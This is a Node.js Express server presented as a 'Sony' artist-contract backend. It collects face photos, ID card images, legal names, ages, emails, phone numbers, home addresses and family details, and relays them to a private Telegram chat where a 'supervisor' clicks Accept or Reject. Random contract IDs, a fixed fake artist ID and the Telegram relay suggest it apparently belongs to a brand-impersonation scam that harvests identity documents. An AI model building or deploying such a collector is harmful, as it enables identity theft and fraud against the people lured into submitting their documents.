require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const SUPERVISOR_CHAT_ID = process.env.SUPERVISOR_CHAT_ID;

app.use(cors({ origin: "*" }));
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });

// IN-MEMORY STATUS STORE (use DB in production if you want persistence)
const approvals = {}; // contractId -> { status: 'pending'|'accepted'|'rejected', reason, artistName, time }

app.get("/", (req, res) => {
  res.send(`<h1>Sony Backend Live ✓</h1>
  <p>POST /api/forward-to-telegram (face + ID image) -> sends Accept/Reject buttons</p>
  <p>GET /api/status/:contractId -> frontend polling</p>
  <p>POST /webhook -> Telegram callback for Accept/Reject</p>`);
});
app.get("/health", (req, res) => res.send("OK"));

// STATUS POLLING ENDPOINT - frontend calls this every 3s
app.get("/api/status/:contractId", (req, res) => {
  const id = req.params.contractId;
  const data = approvals[id];
  if (!data) return res.status(404).json({ status: 'not_found' });
  res.json(data);
});

// HELPER: send photo with Accept/Reject buttons
async function sendApprovalRequest({ contractId, artistName, legalName, phone, region, faceBuffer, idBuffer }) {
  if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) {
    console.log("Missing env");
    return;
  }

  const caption = `
🎤 *NEW CONTRACT - REQUIRES APPROVAL* 🎤
━━━━━━━━━━━━━━━━━━━━
👤 *Artist:* ${artistName}
📛 *Legal:* ${legalName}
📱 *Phone:* ${phone}
🌍 *Country:* ${region}
🆔 *Contract:* \`${contractId}\`
🎫 *Given ID:* \`1100223\`
⏰ *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
🖼️ Face + ID image attached
👇 *Choose:*
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Accept", callback_data: `accept_${contractId}` },
        { text: "❌ Reject", callback_data: `reject_${contractId}` }
      ]
    ]
  };

  // Send face + ID as media group first, then approval message with buttons
  try {
    // 1. Send face photo
    if (faceBuffer) {
      const form = new FormData();
      form.append('chat_id', SUPERVISOR_CHAT_ID);
      form.append('photo', faceBuffer, { filename: `FACE_${artistName}.jpg` });
      form.append('caption', `Face: ${artistName} | ${contractId}`);
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
    }
    // 2. Send ID image photo
    if (idBuffer) {
      const form2 = new FormData();
      form2.append('chat_id', SUPERVISOR_CHAT_ID);
      form2.append('photo', idBuffer, { filename: `ID_${artistName}.jpg` });
      form2.append('caption', `Artist ID Image: ${artistName} | 1100223 | ${contractId}`);
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form2, { headers: form2.getHeaders() });
    }
    // 3. Send approval buttons message
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: SUPERVISOR_CHAT_ID,
      text: caption,
      parse_mode: "Markdown",
      reply_markup: keyboard
    });

  } catch (e) {
    console.error("Telegram send error", e.response?.data || e.message);
  }
}

// MAIN ENDPOINT - receives from frontend
app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: 'facePhoto' }, { name: 'idPhoto' }, { name: 'photo', maxCount: 5 }]), async (req, res) => {
  try {
    const body = req.body || {};
    const files = req.files || {};

    // Support both single file and fields
    let faceBuffer = null;
    let idBuffer = null;

    if (req.file && req.file.buffer) faceBuffer = req.file.buffer;
    if (files.photo && files.photo[0]) faceBuffer = files.photo[0].buffer;
    if (files.facePhoto && files.facePhoto[0]) faceBuffer = files.facePhoto[0].buffer;
    if (files.idPhoto && files.idPhoto[0]) idBuffer = files.idPhoto[0].buffer;

    // base64 fallbacks
    if (!faceBuffer && body.facePhotoBase64 && body.facePhotoBase64.startsWith('data:image')) {
      faceBuffer = Buffer.from(body.facePhotoBase64.split(';base64,').pop(), 'base64');
    }
    if (!faceBuffer && body.photoBase64 && body.photoBase64.startsWith('data:image')) {
      faceBuffer = Buffer.from(body.photoBase64.split(';base64,').pop(), 'base64');
    }
    if (!idBuffer && body.idPhotoBase64 && body.idPhotoBase64.startsWith('data:image')) {
      idBuffer = Buffer.from(body.idPhotoBase64.split(';base64,').pop(), 'base64');
    }

    const { artistName, legalName, age, email, phone, address, married, kids, kidsNum, region, contractId, type, countryCode } = body;
    const finalCid = contractId || `SME-2026-${Math.floor(100+Math.random()*900)}-AF`;

    // If it's the approval step (has ID image), set pending and send buttons
    if (type === 'REQUIRES_APPROVAL' || idBuffer) {
      approvals[finalCid] = {
        status: 'pending',
        artistName: artistName || 'Unknown',
        contractId: finalCid,
        time: new Date().toISOString()
      };

      await sendApprovalRequest({
        contractId: finalCid,
        artistName: artistName || 'Unknown',
        legalName: legalName || 'N/A',
        phone: phone || 'N/A',
        region: region || 'N/A',
        faceBuffer,
        idBuffer
      });

      return res.json({ success: true, status: 'pending', contractId: finalCid, message: 'Sent for supervisor approval with Accept/Reject buttons' });
    }

    // Step 1 - just face submitted
    const text = `
🎤 *NEW SONY CONTRACT (STEP 1 - FACE)* 🎤
━━━━━━━━━━━━━━━━━━━━
👤 *Artist:* ${artistName}
📛 *Legal:* ${legalName}
🎂 *Age:* ${age}
📧 *Email:* ${email}
📱 *Phone:* ${phone}
🏠 *Address:* ${address}
🌍 *Country:* ${region}
🆔 *Contract:* \`${finalCid}\`
⏰ ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
⏳ Waiting for ID image upload...
`;
    if (faceBuffer && BOT_TOKEN && SUPERVISOR_CHAT_ID) {
      const form = new FormData();
      form.append('chat_id', SUPERVISOR_CHAT_ID);
      form.append('photo', faceBuffer, { filename: `FACE_${artistName}.jpg` });
      form.append('caption', text.slice(0, 1024));
      form.append('parse_mode', 'Markdown');
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
    } else if (BOT_TOKEN && SUPERVISOR_CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: SUPERVISOR_CHAT_ID,
        text,
        parse_mode: "Markdown"
      });
    }

    res.json({ success: true, contractId: finalCid });

  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed", details: e.response?.data || e.message });
  }
});

// ID CARD ENDPOINT (kept for compatibility)
app.post("/api/forward-idcard", upload.single('photo'), async (req, res) => {
  try {
    const { artistName, contractId } = req.body || {};
    const buf = req.file?.buffer;
    if (!buf) return res.status(400).json({ error: "No image" });
    if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) return res.json({ success: true, forwarded: false });

    const form = new FormData();
    form.append('chat_id', SUPERVISOR_CHAT_ID);
    form.append('document', buf, { filename: `SONY_ID_${artistName}_${contractId}.png`, contentType: 'image/png' });
    form.append('caption', `🪪 ID CARD GENERATED: ${artistName} | ${contractId}`);
    form.append('parse_mode', 'Markdown');
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
    res.json({ success: true });
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed" });
  }
});

// TELEGRAM WEBHOOK - handles Accept/Reject clicks
app.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data; // accept_SME-... or reject_SME-...
      const chatId = cq.message.chat.id;
      const messageId = cq.message.message_id;

      if (data.startsWith('accept_')) {
        const cid = data.replace('accept_', '');
        approvals[cid] = {...(approvals[cid] || {}), status: 'accepted', contractId: cid, time: new Date().toISOString() };

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          callback_query_id: cq.id,
          text: `✅ Accepted ${cid}`
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
          chat_id: chatId,
          message_id: messageId,
          text: `✅ *ACCEPTED* - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName || ''}\nTime: ${new Date().toLocaleString()}`,
          parse_mode: "Markdown"
        });

      } else if (data.startsWith('reject_')) {
        const cid = data.replace('reject_', '');
        approvals[cid] = {...(approvals[cid] || {}), status: 'rejected', reason: 'Rejected by supervisor - Invalid ID image', contractId: cid, time: new Date().toISOString() };

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          callback_query_id: cq.id,
          text: `❌ Rejected ${cid}`
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
          chat_id: chatId,
          message_id: messageId,
          text: `❌ *REJECTED* - ${cid} by supervisor\nReason: Invalid verification\nTime: ${new Date().toLocaleString()}`,
          parse_mode: "Markdown"
        });
      }
    }
    res.sendStatus(200);
  } catch (e) {
    console.error("webhook error", e.response?.data || e.message);
    res.sendStatus(200);
  }
});

// Optional: set webhook endpoint helper
app.get("/set-webhook", async (req, res) => {
  const url = req.query.url; // e.g. https://yourdomain.onrender.com/webhook
  if (!url) return res.send("Add?url=https://yourdomain.onrender.com/webhook");
  try {
    const r = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(url)}`);
    res.json(r.data);
  } catch (e) {
    res.status(500).json(e.response?.data || e.message);
  }
});

app.listen(PORT, () => console.log(`Sony supervisor bot with Accept/Reject running on ${PORT}`));